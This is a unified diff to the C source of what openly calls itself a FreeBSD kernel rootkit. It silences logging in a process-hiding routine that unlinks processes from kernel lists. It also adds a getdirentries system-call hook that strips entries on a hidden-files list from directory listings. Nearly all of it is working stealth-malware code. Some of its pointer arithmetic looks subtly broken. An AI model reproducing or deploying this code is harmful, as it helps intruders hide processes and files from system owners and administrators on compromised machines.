@@ -16,6 +16,7 @@
  */
 
 #include "hide.h"
+#include "hook.h"
 #include "debug.h"
 #include "config.h"
 
@@ -31,6 +32,15 @@
 #include <sys/proc.h>
 #include <sys/sysent.h>
 #include <sys/sysproto.h>
+#include <sys/malloc.h>
+#include <sys/syscall.h>
+#include <sys/dirent.h>
+#include <sys/uio.h>
+#include <sys/syscallsubr.h>
+#include <sys/file.h>
+#include <sys/filedesc.h>
+#include <sys/vnode.h>
+#include <sys/capsicum.h>
 
 extern linker_file_list_t linker_files;
 extern struct sx kld_sx;
@@ -124,7 +134,7 @@ hide_process_by_id(pid_t id)
 	 * Better performance over pidhashtabl. */
 	LIST_FOREACH(p, PIDHASH(id), p_list)
 	{
-		LOGI("[rootkit:hide_process_by_id] Found PID: %d\n", p->pid);
+		/* LOGI("[rootkit:hide_process_by_id] Found PID: %d\n", p->pid); */
 		if (p->p_pid == id)
 		{
 			/* A process is either NEW, NORMAL, ZOMBIE
@@ -135,7 +145,7 @@ hide_process_by_id(pid_t id)
 				break;
 			}
 
-			LOGI("[rootkit:hide_process_by_id] Hide PID: %d\n", p->pid);
+			/* LOGI("[rootkit:hide_process_by_id] Hide PID: %d\n", p->pid); */
 			PROC_LOCK(p);
 
 			LIST_REMOVE(p, p_list);
@@ -149,3 +159,144 @@ hide_process_by_id(pid_t id)
 	sx_sunlock(&allproc_lock);
 }
 
+static int
+is_hidden_file(char *path)
+{
+	int i;
+
+	for (i = 0; i < NUM_HIDDEN_FILES; i++)
+	{
+		if (strcmp(path, hidden_files[i]) == 0)
+		{
+			return(1);
+		}
+
+	}
+
+	return(0);
+}
+
+static int
+generate_path_from_fd(struct thread *td, int fd, char **retbuf, char **freebuf)
+{
+	int ret;
+
+	struct file *fp;
+	cap_rights_t rights;
+
+	fp = NULL;
+
+	ret = getvnode(td, fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
+	if (ret == 0)
+	{
+		ret = vn_fullpath(td, fp->f_vnode, retbuf, freebuf);
+		fdrop(fp, td);
+	}
+
+	return ret;
+}
+
+static int
+is_hidden_file_in_dir(struct thread *td, int fd, char *filename)
+{
+	int ret;
+	int len;
+
+	char *dirpath;
+	char *freebuf;
+	char *filepath;
+
+	dirpath = NULL;
+	freebuf = NULL;
+	ret = generate_path_from_fd(td, fd, &dirpath, &freebuf);
+	if (ret)
+	{
+		return(ret);
+	}
+
+	/* Allocate string long enough for absolute path. */
+	len = strlen(filename) + strlen(dirpath) + 1;
+	filepath = malloc(len, M_TEMP, M_WAITOK);
+
+	strcpy(filepath, dirpath);
+	strcat(filepath, "/");
+	strcat(filepath, filename);
+
+	LOGI("[rootkit:is_hidden_file_in_dir] Check if file is hidden: %s.\n",
+			filepath);
+
+	ret = is_hidden_file(filepath);
+
+	free(filepath, M_TEMP);
+	free(freebuf, M_TEMP);
+	return(ret);
+}
+
+static int
+getdirentries_hook(struct thread *td, void *syscall_args)
+{
+	struct dirent *dp;
+	struct dirent *current;
+
+	unsigned int size;
+	unsigned int count;
+
+	struct getdirentries_args *uap;
+	uap = (struct getdirentries_args *) syscall_args;
+
+	sys_getdirentries(td, syscall_args);
+	size = td->td_retval[0];
+
+	if (size > 0)
+	{
+		dp = malloc(size, M_TEMP, M_WAITOK);
+		copyin(uap->buf, dp, size);
+
+		current = dp;
+		count = size;
+
+		while ((current->d_reclen != 0) && (count > 0))
+		{
+			count -= current->d_reclen;
+
+			if (is_hidden_file_in_dir(td, uap->fd, current->d_name))
+			{
+				LOGI("[rootkit:getdirentries_hook] Hidden file request.\n");
+				if (count != 0)
+				{
+					bcopy(current + current->d_reclen,
+							current, count);
+				}
+
+				size -= current->d_reclen;
+				break;
+			}
+
+			if (count != 0)
+			{
+				/* Pointer trickery. */
+				current = (struct dirent *)((char *) current
+						+ current->d_reclen);
+			}
+		}
+
+		td->td_retval[0] = size;
+		copyout(dp, uap->buf, size);
+
+		free(dp, M_TEMP);
+	}
+
+	return(0);
+}
+
+void
+hide_files(void)
+{
+	hook_syscall_set(SYS_getdirentries, getdirentries_hook);
+}
+
+void
+unhide_files(void)
+{
+	hook_syscall_set(SYS_getdirentries, sys_getdirentries);
+}
